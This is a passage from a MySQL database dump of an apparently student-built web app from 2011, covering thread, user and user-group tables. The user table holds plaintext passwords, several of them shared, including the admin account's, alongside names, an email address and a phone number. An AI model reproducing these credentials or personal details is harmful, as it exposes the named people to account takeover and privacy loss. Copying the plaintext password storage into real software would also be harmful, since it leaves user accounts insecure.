08:43:58',0,0,0,''),(139,'','','test','','03/Apr/2011 11:00:17',0,0,0,''),(140,'','','test','','03/Apr/2011 11:00:24',0,0,0,''),(141,'','','test','','04/Apr/2011 05:32:02',0,0,0,''),(142,'','','test','','04/Apr/2011 05:32:10',0,0,0,''),(143,'','','test','','04/Apr/2011 05:35:41',0,0,0,''),(144,'','','test','','04/Apr/2011 05:35:47',0,0,0,''),(145,'','','test','','04/Apr/2011 11:00:15',0,0,0,''),(146,'','','test','','04/Apr/2011 11:00:22',0,0,0,''),(147,'','','test','','05/Apr/2011 11:00:16',0,0,0,''),(148,'','','test','','05/Apr/2011 11:00:23',0,0,0,''),(149,'','','test','','06/Apr/2011 09:53:09',0,0,0,''),(150,'','','test','','06/Apr/2011 09:53:16',0,0,0,''),(151,'','','test','','06/Apr/2011 11:00:16',0,0,0,''),(152,'','','test','','06/Apr/2011 11:00:22',0,0,0,''),(153,'','','test','','07/Apr/2011 11:00:16',0,0,0,''),(154,'','','test','','07/Apr/2011 11:00:23',0,0,0,''),(155,'','','test','','08/Apr/2011 11:00:15',0,0,0,'');
/*!40000 ALTER TABLE `threads` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `un` varchar(14) NOT NULL,
  `pw` varchar(100) NOT NULL,
  `fullname` varchar(25) NOT NULL,
  `description` varchar(256) NOT NULL,
  `profile` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
  `contact` varchar(15) NOT NULL,
  `major` varchar(25) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=39 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (0,'cblair','SHI/hel7','Colby Blair','In a bottle.','colby.png','cblair@vandals.uidah','(208) 301-0061','Computer Science'),(11,'anilson','supersecurepassword1234!@#$','','','sfdsfd','fdfd','saas','dsd'),(12,'long3841','long3841','','','','','',''),(13,'sbeddall','0017761826','','','soon.png','','',''),(15,'brett','brett256','Brett Hitchcock','On fire.','khaaan.png','here@there.comdfdf','123','CS'),(17,'timb','frost741','','','','','',''),(18,'claurino','22877822','','','','','',''),(19,'lwegner','7ndustr8','','','','','',''),(20,'crempel','SHI/hel7','','','','','',''),(21,'abhay','gusabhay','','','','','',''),(22,'drj','SHI/hel7','','','','','',''),(24,'admin','SHI/hel7','','','','','',''),(32,'test_user','ALT!shf6','','','','','',''),(35,'test2','test123','','','','test2@vandals.uidaho.edu','','');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `usergroup`
--

DROP TABLE IF EXISTS `usergroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `usergroup` (
  `uid` int(11) NOT NULL,
  `gid` int(11) NOT NULL,
  `perm` tinyint(4) NOT NULL,
  KEY `uid` (`uid`),
  KEY `gid` (`gid`),
  CONSTRAINT `usergroup_ibfk_1` FOREIGN KEY (`uid`) REFERENCES `user` (`id`) ON DELETE CASCADE,
  CONSTRAINT `usergroup_ibfk_2` FOREIGN KEY (`gid`) REFERENCES `ggroup` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usergroup`
--

LOCK TABLES `usergroup` WRITE;
/*!40000 ALTER TABLE `usergroup` DISABLE KEYS */;
INSERT INTO `usergroup` VALUES (24,10,7),(19,10,7),(21,10,0),(21,5,0),(15,10,7),(15,5,7),(13,5,7),(13,10,7),(0,5,7),(0,10,7),(35,5,6),(12,10,0);
/*!40000 ALTER TABLE `usergroup` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2011-04-10 15:26:38
